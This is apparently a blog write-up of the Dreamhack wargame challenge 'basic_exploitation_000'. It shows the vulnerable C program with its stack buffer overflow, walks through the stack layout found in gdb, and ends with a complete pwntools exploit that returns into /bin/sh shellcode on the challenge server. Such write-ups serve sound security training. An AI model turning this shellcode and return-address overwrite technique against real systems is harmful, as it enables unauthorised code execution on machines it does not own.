---
layout: post
title: "[dreamhack] exploitation_000"
comments: true
category: wargame
---

## checksec
<img src="/assets/img/exploitation-000/checksec.png" width="600">

Only aslr exists.

***

## C code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

<img src="/assets/img/exploitation-000/execute.png" width="700">

We can get buf's address from printf.<br />
buf's size is 0x80(128), but binary recives 141 characters by scanf.<br />
We can send input to buf, and cause overflow.<br />

***

## Debug binary

<img src="/assets/img/exploitation-000/gdb.png" width="600">

In gdb, we can check scanf function's arguments by checking stack just before call scanf.<br />
0x8048a65 is '%141s', so buf's location is [ebp-0x80].<br />
payload will be consists of (shellcode) + dummy + SFP + RA.<br />
Scanf function can't receive '\x09, \x0a, \x0b, \x0c, \x0d, \x20', so we have to use shellcode without them.<br />
Dummy's size will be 0x80 - len(shellcode).<br />
SFP also will be overwrite with dummy.<br />
RA will be overwrite with buf's addr.(location of shellcode)

***

## Ex code

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

shellcode = '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'

#r = process('./basic_exploitation_000')
r = remote('host1.dreamhack.games', 21863)

r.recvuntil(b'buf = (')
bufAddr = int(r.recvn(10), 16)
payload = shellcode.encode() + b'A' * (0x80 - len(shellcode)) + b'B' * 0x4 + p32(bufAddr)


r.send(payload)

r.interactive()
```